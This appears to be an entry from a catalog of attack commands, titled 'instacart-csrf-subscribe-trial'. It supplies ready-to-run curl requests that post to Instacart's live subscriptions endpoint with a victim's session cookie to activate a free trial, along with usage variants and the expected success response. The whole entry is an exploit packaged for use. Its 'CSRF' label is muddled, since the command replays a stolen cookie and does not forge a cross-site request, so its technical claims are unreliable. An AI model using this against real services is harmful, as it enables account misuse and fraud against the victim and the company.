---
data: >-
  curl -X POST https://www.instacart.com/v3/subscriptions -H "Content-Type:
  application/x-www-form-urlencoded" -H "Cookie: [session_cookie]" -d
  "free_trial=true&promo=true&term=year"
tags:
  - csrf
  - exploit
type: command
output: >-
  HTTP/1.1 200 OK with JSON: {"id": "sub_123", "duration_in_days": 14, "trial":
  true, "starts_on": "April 6, 2018", "ends_on": "April 20, 2018"}
executor: bash
platforms:
  - Web
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:27:57.431Z'
id: b954fd5e-cb8f-4200-8abf-ba5077302152
verified: false
validated: true
submitted: true
---
# instacart-csrf-subscribe-trial

## Command

```bash
curl -X POST https://www.instacart.com/v3/subscriptions \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -H "Cookie: [session_cookie]" \
  -d "free_trial=true&promo=true&term=year"
```

## Description

This command sends a forged POST request to Instacart's subscriptions endpoint to activate a 14-day express trial without CSRF protection, exploiting an authenticated session to perform unauthorized subscription actions.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-X POST` | Specifies the HTTP method | Yes |
| `-H "Content-Type: ..."` | Sets the form-encoded content type | Yes |
| `-H "Cookie: ..."` | Includes the victim's session cookie for authentication | Yes |
| `-d "free_trial=true&..."` | Payload with trial parameters | Yes |

## Examples

### Basic Usage

```bash
curl -X POST https://www.instacart.com/v3/subscriptions -H "Content-Type: application/x-www-form-urlencoded" -H "Cookie: session=abc123" -d "free_trial=true&promo=true&term=year"
```

### Advanced Usage

```bash
curl -X POST https://www.instacart.com/v3/subscriptions -H "Content-Type: application/x-www-form-urlencoded" -H "Cookie: session=abc123" -H "User-Agent: Mozilla/5.0" -d "free_trial=true&promo=true&term=year" -v
```

## Expected Output

Successful execution returns HTTP/1.1 200 OK with a JSON body containing subscription details, such as id, duration_in_days: 14, trial: true, and start/end dates, indicating the trial has been activated.

## Related

- [[procedures/Exploit-Instacart-CSRF-Subscription]]
